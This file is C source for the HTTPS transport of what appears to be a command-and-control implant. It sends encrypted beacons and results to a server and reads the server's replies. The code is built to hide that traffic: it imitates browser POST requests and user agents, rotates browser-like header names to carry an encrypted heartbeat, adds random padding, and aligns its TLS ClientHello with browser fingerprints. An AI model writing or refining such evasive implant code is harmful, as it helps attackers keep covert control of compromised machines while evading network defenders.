// https_emu.c — HTTPS-emulation transport (H1 Phase 1b)
//
// Strips all WebSocket semantics: each beacon/result exchange is a plain
// HTTPS POST with a JSON-style body (base64 of the encrypted payload plus
// random whitespace padding), the encrypted beat rides in a browser-typical
// header (profile heartbeat_header, default X-Requested-With), and the
// response is the standard WebPageOutput template with the b64 payload
// substituted (same strip discipline as the WS path). Reuses the ws
// connector's TCP/TLS plumbing (embedded mbedtls, JA4-aligned ClientHello).

#include "ws_connector.h"
#include "crt.h"
#include "types.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

#define AF_INET      2
#define SOCK_STREAM  1
#define IPPROTO_TCP  6

struct hs_sockaddr_in {
    uint16_t sin_family;
    uint16_t sin_port;    // network byte order
    uint32_t sin_addr;    // network byte order
    uint8_t  sin_zero[8];
};

// Parse "a.b.c.d:port" (IP only — no DNS in nostdlib)
static int https_parse_address(const char* address, uint32_t* ip, uint16_t* port) {
    const char* colon = (const char*)0;
    for (const char* p = address; *p; p++) {
        if (*p == ':') colon = p;
    }
    if (!colon) return -1;

    uint32_t octets[4] = {0};
    int octet_idx = 0;
    for (const char* p = address; p < colon && octet_idx < 4; p++) {
        if (*p == '.') { octet_idx++; continue; }
        if (*p < '0' || *p > '9' || octet_idx > 3) return -1;
        octets[octet_idx] = octets[octet_idx] * 10 + (uint32_t)(*p - '0');
        if (octets[octet_idx] > 255) return -1;
    }
    if (octet_idx != 3) return -1;

    // Network byte order: octets[0] in the lowest byte (kernel reads the
    // uint32 big-endian → first octet first), same as ws_parse_address.
    *ip = (octets[0]) | (octets[1] << 8) | (octets[2] << 16) | (octets[3] << 24);

    uint32_t p = 0;
    for (const char* c = colon + 1; *c >= '0' && *c <= '9'; c++) {
        p = p * 10 + (uint32_t)(*c - '0');
        if (p > 65535) return -1;
    }
    *port = (uint16_t)((p >> 8) | (p << 8));  // network byte order
    return 0;
}

// TCP connect + optional TLS (embedded mbedtls via the ws connector)
int https_connect(ws_connector_t* ws, const char* host, uint16_t port, int use_ssl) {
    if (ws->state != WS_STATE_DISCONNECTED) {
        ws_disconnect(ws);
    }

    // Build "IP:port"
    char addr_str[64];
    size_t host_len = ax_strlen(host);
    if (host_len + 8 > sizeof(addr_str)) return -1;
    ax_memcpy(addr_str, host, host_len);
    addr_str[host_len] = ':';
    char port_str[8];
    int pi = 0, temp = port;
    if (temp == 0) { port_str[pi++] = '0'; }
    else {
        char rev[8]; int ri = 0;
        while (temp > 0 && ri < 7) { rev[ri++] = '0' + (temp % 10); temp /= 10; }
        while (ri > 0) port_str[pi++] = rev[--ri];
    }
    port_str[pi] = '\0';
    ax_memcpy(addr_str + host_len + 1, port_str, (size_t)pi + 1);

    uint32_t ip;
    uint16_t nport;
    if (https_parse_address(addr_str, &ip, &nport) != 0) return -1;

    int fd = (int)sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) return -1;

    struct hs_sockaddr_in addr;
    ax_memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = nport;
    addr.sin_addr = ip;

    if (sys_connect(fd, (const void*)&addr, sizeof(addr)) != 0) {
        sys_close(fd);
        return -1;
    }

    ws->fd = fd;
    ws->tls_active = 0;
    ws->tls = (void*)0;
    if (use_ssl) {
        if (ws_tls_handshake(ws, fd, host) != 0) {
            sys_close(fd);
            ws->fd = -1;
            return -1;
        }
    }

    ws->state = WS_STATE_CONNECTED;
    ws->use_ssl = use_ssl;
    if (ws->host) ax_free(ws->host);
    ws->host = (char*)ax_malloc(host_len + 1);
    if (ws->host) ax_strcpy(ws->host, host);
    ws->port = port;
    return 0;
}

// Pick the k-th name from a comma-separated header list (heartbeat header
// rotation across a browser-typical set — H1 Phase 1b). Returns a pointer
// into a static buffer valid until the next call.
const char* https_pick_header(const char* list, uint32_t idx) {
    static char buf[64];
    uint32_t n = 1;
    for (const char* p = list; p && *p; p++) if (*p == ',') n++;
    uint32_t k = idx % n;
    const char* s = list;
    while (k > 0) {
        while (*s && *s != ',') s++;
        if (*s == ',') s++;
        k--;
    }
    while (*s == ' ') s++;
    uint32_t i = 0;
    while (*s && *s != ',' && i < 63) buf[i++] = *s++;
    buf[i] = '\0';
    return buf;
}

// POST the b64 payload. Body = b64(data) + random '\n' padding; the encrypted
// beat rides in the hb_header (browser-typical header name).
int https_send(ws_connector_t* ws, const char* uri, const char* user_agent,
               const char* hb_header_name, const char* beat,
               const uint8_t* data, size_t len) {
    if (ws->state != WS_STATE_CONNECTED || ws->fd < 0) return -1;

    // Base64 the payload
    size_t b64_len = ((len + 2) / 3) * 4;
    size_t pad = 0;
    uint8_t rnd = 0;
    (void)ax_random_bytes(&rnd, 1);
    pad = (size_t)(rnd % 16);
    size_t total = b64_len + pad;

    uint8_t* b64 = (uint8_t*)ax_malloc(b64_len + pad + 1);
    if (!b64) return -1;
    if (ws_b64_encode_pub(data, len, (char*)b64, b64_len + 1) != 0) {
        ax_free(b64);
        return -1;
    }
    ax_memset(b64 + b64_len, '\n', pad);  // whitespace padding (stripped server-side)

    // Build the request
    size_t cap = 512 + ax_strlen(uri) + ax_strlen(user_agent) +
                 ax_strlen(hb_header_name) + ax_strlen(beat);
    uint8_t* req = (uint8_t*)ax_malloc(cap);
    if (!req) { ax_free(b64); return -1; }
    size_t rl = 0;

#define HS_APPEND(s) do { \
        size_t sl = ax_strlen(s); \
        ax_memcpy(req + rl, s, sl); \
        rl += sl; \
    } while (0)

    HS_APPEND("POST ");
    HS_APPEND(uri);
    HS_APPEND(" HTTP/1.1\r\n");

    HS_APPEND("Host: ");
    HS_APPEND(ws->host ? ws->host : "127.0.0.1");
    HS_APPEND("\r\n");

    HS_APPEND("User-Agent: ");
    HS_APPEND(user_agent ? user_agent : "Mozilla/5.0");
    HS_APPEND("\r\n");

    HS_APPEND("Accept: */*\r\n");
    HS_APPEND("Accept-Encoding: gzip, deflate\r\n");
    HS_APPEND("Content-Type: application/json\r\n");

    HS_APPEND(hb_header_name ? hb_header_name : "X-Requested-With");
    HS_APPEND(": ");
    HS_APPEND(beat);
    HS_APPEND("\r\n");

    // Content-Length as ASCII
    char cl[16];
    int cli = 0;
    uint64_t t = (uint64_t)total;
    if (t == 0) cl[cli++] = '0';
    else {
        char rev[16]; int ri = 0;
        while (t > 0 && ri < 15) { rev[ri++] = '0' + (int)(t % 10); t /= 10; }
        while (ri > 0) cl[cli++] = rev[--ri];
    }
    cl[cli] = '\0';
    HS_APPEND("Content-Length: ");
    HS_APPEND(cl);
    HS_APPEND("\r\n\r\n");
#undef HS_APPEND

    if (ws_tls_send(ws, req, rl) != 0 ||
        ws_tls_send(ws, b64, total) != 0) {
        ax_free(req);
        ax_free(b64);
        return -1;
    }
    ax_free(req);
    ax_free(b64);
    return 0;
}

// Read the HTTP response: headers until \r\n\r\n, then the Content-Length
// body. Allocates *out_data/*out_len (caller frees).
int https_recv(ws_connector_t* ws, uint8_t** out_data, size_t* out_len) {
    *out_data = (uint8_t*)0;
    *out_len = 0;
    if (ws->state != WS_STATE_CONNECTED || ws->fd < 0) return -1;

    // Read headers byte-wise until \r\n\r\n
    size_t cap = 4096;
    size_t hlen = 0;
    uint8_t* hdr = (uint8_t*)ax_malloc(cap);
    if (!hdr) return -1;
    int done = 0;
    while (!done) {
        if (hlen + 1 > cap) {
            cap *= 2;
            uint8_t* nh = (uint8_t*)ax_realloc(hdr, cap);
            if (!nh) { ax_free(hdr); return -1; }
            hdr = nh;
        }
        int n = ws_tls_recv(ws, hdr + hlen, 1);
        if (n <= 0) { ax_free(hdr); return -1; }
        hlen++;
        if (hlen >= 4 &&
            hdr[hlen-4] == '\r' && hdr[hlen-3] == '\n' &&
            hdr[hlen-2] == '\r' && hdr[hlen-1] == '\n') {
            done = 1;
        }
    }

    // Parse Content-Length (case-insensitive header scan)
    size_t content_len = 0;
    int has_cl = 0;
    for (size_t i = 0; i + 15 < hlen; i++) {
        // match "content-length" case-insensitively — only at a LINE START
        // (after \n), so X-Content-Type-Options-style headers can't false-match
        if (i != 0 && hdr[i - 1] != '\n') continue;
        uint8_t c0 = hdr[i];
        if ((c0 == 'C' || c0 == 'c') && i + 14 < hlen) {
            const char* want = "ontent-length:";
            int m = 1;
            for (int k = 1; want[k-1]; k++) {
                uint8_t h = hdr[i + k];
                uint8_t w = (uint8_t)want[k-1];
                if (h >= 'A' && h <= 'Z') h = (uint8_t)(h + 32);
                if (h != w) { m = 0; break; }
            }
            if (m) {
                const uint8_t* p = hdr + i + 15;
                while (*p == ' ') p++;
                while (*p >= '0' && *p <= '9') {
                    content_len = content_len * 10 + (size_t)(*p - '0');
                    if (content_len > 64u * 1024u * 1024u) { ax_free(hdr); return -1; }
                    p++;
                }
                has_cl = 1;
                break;
            }
        }
    }
    ax_free(hdr);

    if (!has_cl) return -1;

    uint8_t* body = (uint8_t*)ax_malloc(content_len > 0 ? content_len : 1);
    if (!body) return -1;
    if (content_len > 0) {
        if (ws_tls_recv_exact(ws, body, content_len) != 0) {
            ax_free(body);
            return -1;
        }
    }
    *out_data = body;
    *out_len = content_len;
    return 0;
}
